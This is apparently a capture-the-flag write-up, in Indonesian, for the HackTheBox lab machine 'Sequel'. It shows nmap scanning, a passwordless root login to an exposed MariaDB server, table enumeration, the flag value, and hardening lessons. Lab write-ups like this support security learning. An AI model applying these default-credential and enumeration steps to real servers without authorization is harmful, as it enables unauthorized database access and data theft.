# HTB Sequel — Unauthenticated MySQL Access

**Date:** 2026-05-02
**Platform:** HackTheBox (Starting Point)
**Difficulty:** Very Easy
**Category:** Network / Database

---

## Target

Mesin Linux bernama **Sequel** dari HackTheBox Starting Point 2. Target menjalankan database server MariaDB yang terekspos langsung ke jaringan dengan konfigurasi default yang tidak aman — root tanpa password.

## Vulnerability

**Misconfigured MySQL/MariaDB** — user `root` tidak memiliki password, dan port 3306 dapat diakses langsung dari luar tanpa autentikasi. Ini adalah kesalahan konfigurasi umum pada server yang tidak di-hardening setelah instalasi.

## Tools Used

- **Nmap** — port scanning & service enumeration
- **mysql client** — koneksi dan interaksi dengan database

---

## Exploitation Steps

### Step 1 — Reconnaissance

Sebelum scan, pastikan target aktif dan VPN HTB sudah konek.

```bash
ping -c 4 10.129.16.112
```

Lalu scan port untuk cari service yang berjalan di target.

```bash
nmap -sV -sC -T4 10.129.16.112
```

**Hasil:** Port **3306/tcp open** → MySQL/MariaDB terdeteksi berjalan di target.

---

### Step 2 — Enumerasi Service

Dari hasil nmap diketahui port 3306 terbuka. Port ini adalah port default MySQL/MariaDB. Langkah berikutnya adalah mencoba konek langsung menggunakan mysql client dengan user `root` tanpa password — pola misconfiguration yang sangat umum.

```bash
mysql -u root -h 10.129.16.112 --skip-ssl
```

Flag `--skip-ssl` diperlukan karena server tidak mendukung enkripsi SSL (akan muncul ERROR 2026 jika tanpa flag ini).

**Hasil:** Berhasil masuk ke MariaDB shell tanpa password sama sekali.

---

### Step 3 — Database Enumeration

Setelah masuk, lakukan enumerasi untuk cari database dan tabel yang menarik.

```sql
-- Lihat semua database yang tersedia
show databases;

-- Masuk ke database target
use htb;

-- Lihat tabel yang ada
show tables;
```

**Hasil:** Ditemukan dua tabel di database `htb` — `users` dan `config`.

Cek isi kedua tabel.

```sql
-- Lihat isi tabel users
select * from users;

-- Lihat isi tabel config
select * from config;
```

---

### Step 4 — Getting the Flag

Di tabel `config`, terdapat row dengan kolom `name` berisi `flag` dan kolom `value` berisi string flag.

```sql
select * from config;
```

Flag ditemukan di baris ke-5 pada kolom `value`.

---

## Proof

```
Flag: 7b4bec00d1a39e3dd4e021ec3d915da8
```

---

## Lessons Learned

- **Misconfiguration adalah celah nyata** — root tanpa password bukan hanya masalah lab, ini terjadi di server production sungguhan yang tidak di-hardening.
- **Port 3306 tidak boleh terekspos ke publik** — database server seharusnya hanya bisa diakses dari localhost atau jaringan internal, bukan dari internet.
- **Selalu coba kredensial default** — saat reconnaissance, coba dulu `root` tanpa password sebelum pakai teknik yang lebih kompleks.
- **`--skip-ssl` penting diketahui** — error SSL bukan berarti gagal total, bisa di-bypass kalau server memang tidak support SSL.
- **Enumerasi sistematis** — alur `show databases` → `use db` → `show tables` → `select * from tabel` adalah pola standar yang harus dihafalkan.
- **Bedakan konteks help** — `--help` dipakai dari terminal sebelum masuk tool, `help;` dipakai setelah masuk MySQL shell. Keduanya beda konteks.